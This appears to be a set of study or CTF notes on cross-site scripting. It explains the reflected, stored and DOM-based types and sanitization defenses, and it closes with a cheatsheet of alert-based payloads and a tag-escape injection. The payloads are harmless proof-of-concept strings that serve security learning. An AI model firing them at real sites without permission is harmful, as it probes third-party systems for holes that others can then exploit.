# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a security vulnerability in web applications that allows code to be injected into web pages viewed by users. It's a useful concept to understand for web security practice.

## Types of XSS

### Reflected XSS

This type of XSS occurs when an application includes user-supplied data from an HTTP request in its response without proper validation.

**Example:**
Imagine a search page that shows your search term.
`https://example.com/search?query=my-search-term`

If the site is not secure, a crafted link could include a script:
`https://example.com/search?query=<script>alert('XSS Proof of Concept')</script>`

When this link is visited, a simple alert box would appear, demonstrating the vulnerability.

### Stored XSS

Stored XSS happens when an application saves user input and later displays it to other users without sanitizing it.

**Example:**
A comments section on a blog. If a user can submit a comment containing a script, it gets stored on the server.

```html
<!-- A user's comment -->
<p>This is a helpful article.</p>
<script>alert('Stored XSS Proof of Concept');</script>
```
Anyone who views this comment would see an alert box, showing that the script was executed.

### DOM-based XSS

This vulnerability occurs within the page's Document Object Model (DOM). Client-side JavaScript takes data from an untrusted source and writes it into the DOM.

**Example:**
A page might use JavaScript to get a name from the URL and display it.
`var name = new URLSearchParams(window.location.search).get('name');`
`document.getElementById('welcome-message').innerHTML = "Hello, " + name;`

A crafted URL could execute a script:
`https://example.com/welcome?name=<img src=x onerror=alert('DOM XSS PoC')>`

The script runs when the `innerHTML` is updated, again triggering a simple alert.

## Common Payloads for Learning

These are simple payloads used to confirm if a vulnerability exists.
*   **Basic Alert:** `<script>alert('XSS')</script>`
*   **Image-based Alert:** `<img src=x onerror=alert('XSS')>`
*   **SVG-based Alert:** `<svg onload=alert('XSS')>`

## Understanding Input Sanitization

To prevent XSS, applications sanitize user input. In a CTF context, it's important to understand these defenses.
*   **Encoding:** Special characters are often encoded (e.g., `<` becomes `&lt;`).
*   **Tag Filtering:** Certain HTML tags like `<script>` may be removed by the application.
*   **Attribute Filtering:** Attributes like `onerror` or `onload` may be stripped from HTML tags.

Understanding how these sanitization methods work is key to learning about web security.

## Cheatsheet
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

```html
<script>alert('xss')</script>
```

```html
<img src='x' onerror="alert('xss')">
```

```html
<img src='x' onload="alert('xss')">
```

```html
<body onload="alert('xss')"/>
```

```html
<iframe src="javascript:alert('xss')">
```

```javascript
javascript:alert(3)
```

```javascript
';alert('xss');//
```

```html
<bla onfocus="alert(2)" tabindex="1">spider</bla>
```

```javascript
var message = `0 search results for '${alert(222)}'`;
```

Escape html tags

```html
<img src="/resources/images/tracker.gif?searchTerms=UserInput">
```

If you see a tag where user input is being placed into the tag there a chance to escape out of the tag.
In the example below `UserInput` is being replaced with xss injection `"><script>alert(3)</script>//`

```html
<img src="/resources/images/tracker.gif?searchTerms="><script>alert(3)</script>//">
```